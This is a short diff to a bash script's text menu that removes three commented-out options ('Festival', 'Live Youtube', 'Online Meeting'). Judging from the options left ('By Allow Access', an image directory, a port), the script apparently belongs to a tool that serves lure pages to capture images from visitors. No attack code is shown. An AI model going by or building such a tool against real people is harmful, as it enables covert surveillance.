@@ -431,9 +431,6 @@ sleep 1
 echo -e "${ask}Choose an option:
 
 ${cyan}[${white}1${cyan}] ${yellow}By Allow Access
-#${cyan}[${white}2${cyan}] ${yellow}Festival
-#${cyan}[${white}3${cyan}] ${yellow}Live Youtube
-#${cyan}[${white}4${cyan}] ${yellow}Online Meeting
 ${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
 ${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
 ${cyan}[${white}x${cyan}] ${yellow}About
